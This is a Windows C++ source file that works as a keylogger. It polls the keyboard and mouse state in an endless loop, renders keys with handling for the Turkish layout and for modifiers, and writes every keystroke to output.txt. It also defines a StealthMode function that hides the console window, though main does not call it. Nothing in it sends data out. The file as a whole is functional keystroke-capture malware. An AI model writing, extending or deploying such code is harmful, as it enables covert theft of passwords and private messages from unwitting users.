#include <iostream>
#include <string>
#include <conio.h>
#include <windows.h>
#include <winuser.h>
#include <io.h>
#include <fcntl.h>
#include <cwctype>
#include <locale>
#include <vector>

using namespace std;

int get_keyboard_layout_code()
{
    CHAR temp[KL_NAMELENGTH+5];
    GetKeyboardLayoutNameA(temp);
    // wcout << temp << endl;

    string s(temp);
    // wcout << s << endl;

    int code = stoi(s, nullptr, 16);
    return code;
}

bool is_alpha_unicode(wchar_t c)
{
    std::locale loc1("C");
    return std::isalpha(c, loc1);
}

bool is_letter(wstring &s)
{
    return s.size() == 1 && is_alpha_unicode(s[0]);
}

std::wstring StandardKeyToStringW(DWORD VKey)
{
    static WCHAR name[32] = L"";
    static BYTE kbState[256] = { 0 };
    DWORD idThread;
    idThread = GetWindowThreadProcessId(GetForegroundWindow(), nullptr);
    long code = MapVirtualKeyExW(VKey, MAPVK_VK_TO_VSC, 
                                 GetKeyboardLayout(idThread)) << 16;
    ToUnicodeEx(VKey, MapVirtualKey(VKey, MAPVK_VK_TO_VSC), kbState, name, 
                                    32, 0, GetKeyboardLayout(idThread));
    return name;
}

std::wstring key_to_string_plain(DWORD key)
{
    if(key >= 0x70 && key <= 0x87) // F key
    {
        wstring s = L"F";
        s += to_wstring(key-111);
        return s;
    }
    switch(key)
    {
        case VK_SPACE: return L"SPACEBAR";
        case VK_LBUTTON: return L"MOUSELEFT";
        case VK_RBUTTON: return L"MOUSERIGHT";
        case VK_MBUTTON: return L"MOUSEMID";
        case VK_RETURN: return L"\n";
        case VK_BACK: return L"BACKSPACE";
        case VK_TAB: return L"TAB";
        case VK_ESCAPE: return L"ESC";
        case VK_INSERT: return L"INS";
        case VK_DELETE: return L"DEL";
        default: return StandardKeyToStringW(key);
    }
}

std::wstring key_to_string(DWORD key)
{
    if(key == VK_SPACE) return L" ";

    wstring temp = key_to_string_plain(key);
    if(temp.size() > 1) return L'$' + temp + L'$';
    else return temp;
}

// wchar_t StandardKeyToStringW(DWORD VKey)
// {
//     static WCHAR name[32] = L"";
//     static BYTE kbState[256] = { 0 };
//     DWORD idThread;
//     idThread = GetWindowThreadProcessId(GetForegroundWindow(), nullptr);
//     long code = MapVirtualKeyExW(VKey, MAPVK_VK_TO_VSC, 
//                                  GetKeyboardLayout(idThread)) << 16;
//     ToUnicodeEx(VKey, MapVirtualKey(VKey, MAPVK_VK_TO_VSC), kbState, name, 
//                                     32, 0, GetKeyboardLayout(idThread));
//     return name[0];
// }

void StealthMode()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
}

// bool is_miscellaneous_key(int VKey)
// {
//     if(VKey == VK_OEM_1 || VKey == VK_OEM_2 || VKey == VK_OEM_3 || (VKey >= VK_OEM_4 && VKey <= VK_OEM_8)) return true;
//     return false;
// }

bool is_altgr_active()
{
    return GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU);
}

wstring read_key_default(DWORD key)
{
    bool ctrl = GetAsyncKeyState(VK_CONTROL);
    bool alt = GetAsyncKeyState(VK_MENU);
    bool super = GetAsyncKeyState(VK_LWIN) || GetAsyncKeyState(VK_RWIN);
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool shift = GetAsyncKeyState(VK_SHIFT);
    bool capitalizeLetter = capsLock != shift;

    // wstring s = StandardKeyToStringW(key);
    wstring s = key_to_string_plain(key);

    if(s.empty()) return L"";

    wstring prefix = L"";
    if(shift) prefix += L"shift ";
    if(ctrl) prefix += L"ctrl ";
    if(alt) prefix += L"alt ";
    if(super) prefix += L"super ";

    if(ctrl || alt || super)
    {
        wstring temp = L'$' + prefix + s + L'$';
        return temp;
    }
    else if(is_letter(s))
    {
        if(capitalizeLetter) CharUpperBuffW(&s[0], 1);
        return s;
    }
    else if(shift)
    {
        wstring temp = L'$' + prefix + s + L'$';
        return temp;
    }
    else return key_to_string(key);


    // if(is_letter(s)) // letter
    // {
    //     // wstring s = StandardKeyToStringW(key);
    //     if(capitalizeLetter) CharUpperBuffW(&s[0], 1);
    //     return s;
    // }
    // else if(key >= 0x70 && key <= 0x87) // F key
    // {
    //     // wstring s = L"$F";
    //     s = L"$F";
    //     s += to_wstring(key-111);
    //     s += L"$";
    //     return s;
    // }
    // switch(key)
    // {
    //     case VK_RETURN: return L"\n";
    //     case VK_BACK: return L"$BACKSPACE$";
    //     case VK_TAB: return L"$TAB$";
    //     case VK_ESCAPE: return L"$ESC$";
    //     case VK_INSERT: return L"$INS$";
    //     case VK_DELETE: return L"$DEL$";
    //     default: return s;
    // }
}

std::wstring read_key_tr(DWORD key)
{
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool shift = GetAsyncKeyState(VK_SHIFT);
    bool capitalizeLetter = capsLock != shift;
    bool altgr = is_altgr_active();
    bool ctrl = GetAsyncKeyState(VK_CONTROL);
    bool alt = GetAsyncKeyState(VK_MENU);
    bool super = GetAsyncKeyState(VK_LWIN) || GetAsyncKeyState(VK_RWIN);

    if(key == 0x49)
    {
        if(altgr)
        {
            if(capitalizeLetter) return L"İ";
            else return L"i";
        }
        else if(capitalizeLetter) return L"I";
        else return L"ı";        
    }
    else if(key == 0xDE)
    {
        if(capitalizeLetter) return L"İ";
        else return L"i";
    }
    else if(key == 0x41 && altgr) return capitalizeLetter ? L"Æ" : L"æ";
    else if(super || (shift && ctrl) || (shift && alt)) return read_key_default(key);
    else if(altgr)
    {
        switch(key)
        {
            case 0xC0: return L"<";
            case 0x31: return L">";
            case 0x32: return L"£";
            case 0x33: return L"#";
            case 0x34: return L"$";
            case 0x35: return L"½";
            case 0x37: return L"{";
            case 0x38: return L"[";
            case 0x39: return L"]";
            case 0x30: return L"}";
            case 0xDF: return L"\\";
            case 0xBD: return L"|";
            case 0x51: return L"@";
            case 0x45: return L"€";
            case 0x54: return L"₺";
            case 0x53: return L"ß";
            case 0xDB: return L"¨";
            case 0xDD: return L"~";
            case VK_OEM_COMMA: return L"`";
            case 0xBA: return L"´";
            case VK_OEM_102: return L"|";

        }
    }
    else if(shift)
    {
        switch(key)
        {
            case 0xC0: return L"é";
            case 0x31: return L"!";
            case 0x32: return L"'";
            case 0x33: return L"^";
            case 0x34: return L"+";
            case 0x35: return L"%";
            case 0x36: return L"&";
            case 0x37: return L"/";
            case 0x38: return L"(";
            case 0x39: return L")";
            case 0x30: return L"=";
            case 0xDF: return L"?";
            case 0xBD: return L"_";
            case VK_OEM_COMMA: return L";";
            case VK_OEM_PERIOD: return L":";
            case VK_OEM_102: return L">";
        }
    }
    
    return read_key_default(key);
}

// bool test(int c)
// {
//     if(c >= 0x30 && c <= 0x39) return true;
//     else if(c >= 0x41 && c <= 0x5A) return true;
//     else if(c >= 0x60 && c <= 0x6F) return true;
//     else if(is_miscellaneous_key(c)) return true;
//     else if(c == VK_RETURN) return true;
//     else if(c == VK_SPACE) return true;
//     else return false;
// }

// bool skip(int key)
// {
//     if(key < 0x08) return true;
//     else if()
// }

std::vector<int> generate_key_list()
{
    std::vector<int> keyList{VK_LBUTTON, VK_RBUTTON, VK_MBUTTON, VK_BACK, VK_TAB, VK_RETURN, VK_ESCAPE,
    VK_SPACE, VK_LEFT, VK_UP, VK_RIGHT, VK_DOWN, VK_SNAPSHOT, VK_INSERT, VK_DELETE, VK_APPS, VK_SLEEP,
    0xE6, 0xE7, 0xE9, 0xF5};
    for(int key = 0x30; key <= 0x39; key++) keyList.push_back(key);
    for(int key = 0x41; key <= 0x5A; key++) keyList.push_back(key);
    for(int key = 0x60; key <= 0x6F; key++) keyList.push_back(key);
    for(int key = 0x70; key <= 0x87; key++) keyList.push_back(key);
    for(int key = 0xBA; key <= 0xC0; key++) keyList.push_back(key);
    for(int key = 0xDB; key <= 0xDF; key++) keyList.push_back(key);
    for(int key = 0xE1; key <= 0xE4; key++) keyList.push_back(key);

    return keyList;
}

int main()
{
    freopen("output.txt", "w", stdout);
    
    _setmode(_fileno(stdout), _O_U16TEXT);
    // std::setlocale(LC_ALL, "en_US.utf8");

    int kbcode = get_keyboard_layout_code();
    wprintf(L"$kbcode: %x$\n", kbcode);
    // int kbcode = 0;
    int c;
    int last = -1;
    std::vector<int> keyList = generate_key_list();
    while(true)
    {
        for(int key:keyList)
        {
            // if(!test(c)) continue;
            if(GetAsyncKeyState(key) == -32767)
            {
                wstring result;
                // int temp = get_keyboard_layout_code();
                // if(kbcode != temp)
                // {
                //     kbcode = temp;
                //     wcout << L"31";
                //     wprintf(L"$kbcode: %x$\n", kbcode);
                // }
                if(kbcode == 0x41f) result = read_key_tr(key);
                else result = read_key_default(key);
                wcout << result;
            }
        }
    }
}
